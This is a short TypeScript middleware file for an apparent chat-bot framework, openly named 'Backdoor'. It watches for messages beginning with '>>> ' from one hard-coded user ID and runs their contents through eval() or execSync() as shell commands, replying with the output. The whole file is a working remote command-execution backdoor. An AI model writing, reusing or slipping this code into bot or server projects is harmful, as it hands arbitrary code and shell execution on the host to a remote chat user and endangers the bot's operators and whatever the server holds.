import { Dispose, Middleware, MiddlewareCallback, MiddlewareInstance } from "Niko/middleware";

import { execSync } from "node:child_process";

export default class extends Middleware implements MiddlewareInstance {
  public MIDDLEWARE_NAME = "Backdoor";
  public MIDDLEWARE_AUTHOR = "Kamenomi";
  public MIDDLEWARE_VERSION = "0.0.1";

  public constructor(patch: (func: MiddlewareCallback) => Dispose) {
    super();

    patch((context, next) => {
      if (context.content.startsWith(">>> ")) {
        if (context.target != 2937396379) {
          return "You have no permission to do that. ";
        }

        const command = context.content.slice(4);

        if (command.startsWith("eval ")) {
          try {
            return eval(command.slice(5));
          } catch (error) {
            return "Eval Failed. \n" + JSON.stringify(error);
          }
        }

        try {
          return execSync(command).toString();
        } catch (error) {
          return "Exec Failed. \n" + JSON.stringify(error);
        }
      }

      return next();
    });
  }
}
